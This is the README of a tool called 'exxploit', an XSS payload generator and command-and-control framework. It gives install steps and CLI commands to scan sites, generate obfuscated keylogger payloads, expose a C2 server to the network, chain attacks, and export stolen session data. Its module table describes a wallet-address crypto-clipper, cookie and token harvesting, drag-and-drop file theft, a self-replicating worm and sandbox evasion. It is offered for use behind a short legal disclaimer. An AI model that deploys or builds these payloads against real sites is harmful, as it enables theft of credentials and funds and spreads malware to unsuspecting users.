# exxploit

> **Launch-Grade XSS Payload Toolkit & C2 Framework**

[![CI](https://github.com/Xfactum/exxploit/workflows/CI/badge.svg)](https://github.com/Xfactum/exxploit/actions)
[![Python 3.9+](https://img.shields.io/badge/python-3.9+-blue.svg)](https://www.python.org/downloads/)
[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20macOS%20%7C%20Windows-lightgrey.svg)](https://github.com/Xfactum/exxploit)

A professional red-teaming framework for XSS payload generation, automated exploitation, and session-based C2 management. Designed for authorized security auditing with advanced evasion capabilities.

---

## ⚡ Key Features

- **🕵️ Zero-Day Evasion**: Detects and bypasses DevTools, headless browsers, and sandboxed environments.
- **🔐 Session Management**: Automatic secure key generation per engagement. Isolates targets to prevent cross-contamination.
- **🛡️ Production C2**: High-performance Waitress-based C2 server with rate limiting, caching, and async logging.
- **🎓 Training Lab**: Built-in isolated simulation environment for safe practice.
- **🎭 Behavioral Camouflage**: Mimics human jitter/interaction to mask malicious activity.
- **🧩 Polymorphic Payloads**: Auto-generates unique signatures for every request.

---

## 🚀 Installation

### Prerequisites

- **Python 3.9+** - [Download here](https://www.python.org/downloads/)
- **Git** - [Download here](https://git-scm.com/downloads)

### Linux / macOS

```bash
# 1. Clone the repository
git clone https://github.com/Xfactum/exxploit.git
cd exxploit

# 2. Install Python dependencies
pip install -r requirements.txt

# 3. Install exxploit as a CLI tool
pip install -e .

# 4. (Optional) Install Playwright for automated browser scanning
playwright install chromium

# 5. Verify installation
exxploit --version
```

### Windows (PowerShell)

```powershell
# 1. Clone the repository
git clone https://github.com/Xfactum/exxploit.git
cd exxploit

# 2. Install Python dependencies
python -m pip install -r requirements.txt

# 3. Install exxploit as a CLI tool
python -m pip install -e .

# 4. (Optional) Install Playwright for automated browser scanning
playwright install chromium

# 5. Verify installation
exxploit --version
```

### Troubleshooting Installation

| Issue | Solution |
|-------|----------|
| `command not found: exxploit` | Ensure `~/.local/bin` is in your PATH, or run `python -m exxploit` instead |
| `pip: command not found` | Use `pip3` instead of `pip`, or `python3 -m pip` |
| Permission errors | Add `--user` flag: `pip install --user -e .` |
| `missing build_editable hook` | **Common on VPS:** Run `pip install --upgrade pip setuptools` before installing |

> [!TIP]
> **Production/VPS tip:** For production systems, you can skip the `-e` (editable) flag and install directly: `pip install .`

---

## 🎓 Quick Start: Training Lab

**New to exxploit?** Start with the isolated training environment to practice safely without impacting real systems.

```bash
exxploit lab
```

This launches:
- **Vulnerable target app** on port `5000` - A sandbox web app with intentional XSS flaws
- **C2 server** on port `8081` - Receives exfiltrated data from payloads

Follow the on-screen instructions to scan and exploit the target.

---

## 🛠️ CLI Commands Reference

| Command | Description |
|---------|-------------|
| `exxploit scan <url>` | Scan URL for XSS vulnerabilities |
| `exxploit payload <type>` | Generate an obfuscated payload |
| `exxploit server` | Start the C2 server |
| `exxploit session <action>` | Manage engagement sessions |
| `exxploit attack` | Execute full attack chain |
| `exxploit lab` | Start training environment |
| `exxploit list` | List all available payloads |
| `exxploit shell` | Start interactive REPL mode |
| `exxploit sessions` | View captured C2 session data |
| `exxploit templates` | Manage payload templates |
| `exxploit config` | Manage configuration |

Use `exxploit <command> --help` for detailed options on any command.

---

## 📖 Usage Guide

### 1. Create an Engagement Session (Recommended)

Sessions isolate your engagements and auto-generate unique encryption keys.

```bash
# Create a new session for a target
exxploit session new acme-corp --target https://acme.com

# List all active sessions
exxploit session list

# Switch to an existing session
exxploit session use acme-corp
```

### 2. Start the C2 Server

Launch the Command & Control server to receive exfiltrated data from payloads.

```bash
# Start on default port (8080, localhost only)
exxploit server

# Expose to network (for VPS/remote deployments)
exxploit server --host 0.0.0.0 --port 8080

# With custom log file
exxploit server --log /path/to/c2.log
```

### 3. Scan for Vulnerabilities

Scan a target URL for XSS injection points. Use `INJECT` as a marker where payloads should be tested.

```bash
# Basic scan
exxploit scan "http://target.com/search?q=INJECT"

# Scan with stealth mode (human-like behavior)
exxploit scan "http://target.com/page?param=INJECT" --stealth

# Scan with verbose output
exxploit scan "http://target.com/search?q=INJECT" --verbose
```

### 4. Generate Payloads

Generate obfuscated JavaScript payloads linked to your C2 server.

```bash
# List all available payload types
exxploit list

# Generate a keylogger payload
exxploit payload keylogger

# Generate with specific obfuscation
exxploit payload keylogger --obfuscate charcode

# Generate polymorphic variant (unique signature)
exxploit payload keylogger --poly

# Save payload to file
exxploit payload keylogger --output payload.js
```

### 5. Execute Full Attack Chain

Combine multiple payloads into a single attack sequence.

```bash
# Chain: Evasion → Keylogger
exxploit attack --payloads "evasion,keylogger"

# Full stealth chain
exxploit attack --payloads "evasion,camouflage,keylogger,exfil"
```

### 6. View Captured Data

Access exfiltrated data from the C2 server.

```bash
# View captured sessions
exxploit sessions

# Export session data
exxploit sessions export --format json
```

---

## 📦 Payload Modules

| Module | Description |
|--------|-------------|
| **evasion** | Detects analysis environments (VMs, debuggers) and self-destructs |
| **camouflage** | Adds fake user interaction (mouse events, scroll) to mask bot behavior |
| **keylogger** | Captures keystrokes and exfiltrates via WebRTC/Beacon |
| **miner** | Crypto-clipper that swaps wallet addresses in clipboard/DOM |
| **clipboard** | Harvests session tokens, cookies, and LocalStorage data |
| **download** | Steals files via drag-and-drop hijacking |
| **replicate** | Self-replicating worm via iframe injection |
| **exfil** | Data exfiltration via multiple channels |

---

## ⚙️ Configuration

Configuration is stored in `~/.exxploit/config.yaml`. You can manage it via CLI:

```bash
# View current configuration
exxploit config show

# Set a configuration value
exxploit config set c2.host 0.0.0.0
exxploit config set c2.port 8080
```

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `EXXPLOIT_C2_HOST` | C2 server bind address | `127.0.0.1` |
| `EXXPLOIT_C2_PORT` | C2 server port | `8080` |
| `EXXPLOIT_AUTH_KEY` | Override session auth key | (auto-generated) |

---

## 🏗️ Architecture

```
exxploit/
├── exxploit/              # Core Python package
│   ├── cli.py             # Typer-based CLI entry point
│   ├── core/              # Scanner, Stealth, Automation modules
│   ├── config/            # Configuration management
│   └── server/            # C2 server implementation
├── *.js                   # JavaScript payload templates
├── tests/                 # Unit tests and training lab
├── logs/                  # C2 event logs (JSON structured)
└── requirements.txt       # Python dependencies
```

**Components:**
- **CLI**: Python-based CLI built with [Typer](https://typer.tiangolo.com/) + Rich for beautiful output
- **C2 Server**: Flask/Waitress server for payload delivery and data aggregation
- **Automation**: Playwright-based `GhostAuditBot` for verifying exploits

---

## 🧪 Running Tests

```bash
# Run all tests
pytest

# Run with coverage
pytest --cov=exxploit

# Run specific test file
pytest tests/test_lab_isolation.py
```

---

## ⚠️ Legal Disclaimer

> [!CAUTION]
> **This tool is for authorized security testing and educational purposes only.**
> 
> Using this tool against systems you do not have explicit permission to test is **illegal** and violates terms of service. The authors accept no liability for any misuse of this software.
>
> Always obtain written authorization before conducting security assessments.

---

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch: `git checkout -b feature/my-feature`
3. Commit your changes: `git commit -m "Add my feature"`
4. Push to the branch: `git push origin feature/my-feature`
5. Open a Pull Request

---

## 📄 License

MIT License - See [LICENSE](LICENSE) for details.

---

<p align="center">
  <strong>Built for security professionals. Use responsibly.</strong><br>
  <a href="https://github.com/Xfactum/exxploit">GitHub</a> •
  <a href="https://github.com/Xfactum/exxploit/issues">Report Bug</a> •
  <a href="https://github.com/Xfactum/exxploit/issues">Request Feature</a>
</p>
